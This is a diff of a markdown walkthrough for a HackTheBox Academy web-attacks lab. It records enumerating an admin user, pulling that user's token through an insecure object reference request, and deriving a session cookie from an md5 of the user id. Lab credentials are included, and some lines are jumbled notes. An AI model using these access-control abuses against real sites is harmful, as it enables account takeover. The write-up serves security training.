@@ -218,8 +218,11 @@ php -S 0.0.0.0:80
   
 # Web Attacks - Skills Assessment  
 
->[Scenario](https://academy.hackthebox.com/module/134/section/1219) You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. 
+>[Scenario](https://academy.hackthebox.com/module/134/section/1219) You are performing a web application penetration test for a software development company, 
+>and they task you with testing the latest build of their social networking web application. 
 >The login details are provided to `94.237.49.11` with user `htb-student` and password `Academy_student!`.  
+
+>Objective -  Escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
 
 ## Foothold  
 
@@ -240,8 +243,21 @@ Connection: close
 
 ![web-attack-skills-assessment-enum-admin-user](/images/web-attack-skills-assessment-enum-admin-user.png)  
 
->Get admin token, `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}` and the response is `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}`  
+>Get admin token using the request, `GET /api.php/token/52 HTTP/1.1}` and receiving the response is `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}`  
 
+```
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+```  
+
+>Source code from `http://94.237.49.11:42268/settings.php` 
+
+![web-attack-skills-assessment-source-code](/images/web-attack-skills-assessment-source-code.png)   
+
+
+Generate cookie pair value for the PHPSESSID using md5 value, `echo -n 52 | md5sum
+7upnen37ktj7tgo7jds7v0fhhj
+7upnen37ktj7tgo7jds7v0fhhj
+9a1158154dfa42caddbd0694a4e9bdc8
 
 
 
